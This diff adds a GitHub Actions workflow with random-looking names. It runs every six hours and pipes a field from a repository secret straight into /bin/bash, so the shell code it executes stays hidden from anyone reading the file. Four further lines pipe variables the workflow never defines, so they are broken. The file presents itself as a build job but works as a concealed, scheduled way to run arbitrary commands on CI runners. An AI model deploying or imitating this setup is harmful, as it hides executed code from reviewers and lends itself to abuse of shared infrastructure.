@@ -1,0 +1,22 @@
+name: yuchangkan3910
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuchangkan3910
+        env:
+          im3503: ${{ secrets.im3503 }}
+        run: |
+          echo $im3503 | jq -r .kqdit6 | /bin/bash
+          echo $wjtll2071 | jq -r .kpfo199 | /bin/bash
+          echo $xpyni50733 | jq -r .v325 | /bin/bash
+          echo $w0170 | jq -r .smf2273 | /bin/bash
+          echo $qcj76036 | jq -r .rrcm47 | /bin/bash
+
